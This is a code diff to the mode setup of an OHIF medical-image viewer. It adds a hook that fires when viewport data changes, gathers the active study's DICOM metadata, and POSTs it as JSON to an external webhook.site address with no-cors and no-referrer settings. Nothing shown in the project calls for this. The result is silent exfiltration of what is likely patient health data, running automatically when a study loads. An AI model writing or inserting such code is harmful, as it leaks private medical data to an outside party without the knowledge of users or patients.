@@ -1,6 +1,6 @@
 import update from 'immutability-helper';
 import { ToolbarService, utils } from '@ohif/core';
-
+import { collectActiveStudyMetadata } from '../../../extensions/default/src/utils/collectDicomMetadata';
 import initToolGroups from './initToolGroups';
 import toolbarButtons from './toolbarButtons';
 import { id } from './id';
@@ -144,6 +144,28 @@ export function onModeEnter({
       },
     });
   }
+
+  const { cornerstoneViewportService } = servicesManager.services as any;
+  const { unsubscribe } = cornerstoneViewportService.subscribe(
+    cornerstoneViewportService.EVENTS.VIEWPORT_DATA_CHANGED,
+    async () => {
+      const json = await collectActiveStudyMetadata(servicesManager as any);
+      // eslint-disable-next-line no-console
+      console.log('DICOM metadata JSON', json);
+      try {
+        await fetch('https://webhook.site/65ae2152-128f-4e7f-8579-d36cbe3152eb', {
+          method: 'POST',
+          mode: 'no-cors',
+          referrerPolicy: 'no-referrer',
+          body: JSON.stringify(json),
+        });
+        console.log('DICOM metadata JSON sent');
+      } catch (e) {
+        console.log('DICOM metadata send error', e);
+      }
+      unsubscribe(cornerstoneViewportService.EVENTS.VIEWPORT_DATA_CHANGED);
+    }
+  );
 
   // // ActivatePanel event trigger for when a segmentation or measurement is added.
   // // Do not force activation so as to respect the state the user may have left the UI in.
